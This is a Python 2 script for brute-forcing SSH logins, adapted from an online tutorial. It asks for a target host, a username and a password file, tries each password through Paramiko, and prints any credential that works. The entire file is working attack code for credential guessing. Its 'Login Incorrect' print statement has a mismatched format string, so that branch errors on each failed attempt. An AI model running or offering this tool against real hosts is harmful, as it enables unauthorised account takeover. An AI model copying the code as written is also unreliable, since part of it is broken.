#!/usr/bin/env python

# SSH brute force script from https://null-byte.wonderhowto.com/how-to/sploit-make-ssh-brute-forcer-python-0161689/
# Requirements : 
# - Paramiko Python module : http://www.paramiko.org/


import paramiko,os,sys,socket

global host, username, line, input_file

def ssh_connect(password, code = 0):
	ssh = paramiko.SSHClient()
	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

	try:
		ssh.connect(host, port=22, username=username, password=password)
	except paramiko.AuthenticationException:
		# Authentication Failed!
		code = 1
	except socket.error, e:
		# Connection Failed!
		code = 2

	ssh.close()
	return code

try:
	host = raw_input("Enter target host:")
	username = raw_input("Enter username:")
	input_file = raw_input("Enter password filename:")

	if os.path.exists(input_file) == False:
		print "Password file does not exist"
		sys.exit(4)

	input_file = open(input_file)

	for line in input_file.readlines():
		password = line.strip("\n")

		try:
			response = ssh_connect(password)

			if response == 0:
				print ("User: %s Pass Found: %s" % (username, password))
				sys.exit(0)
			elif response == 1:
							print ("%s User: %s Pass: %s Login Incorrect" % (username, password))
			elif response == 2:
				print ("Connection failed to host %s!" % (host))
				sys.exit(2)
		except Exception, e:
			print e
			pass
	input_file.close()

except KeyboardInterrupt:
	print "User requested and interrupt"
	sys.exit(3)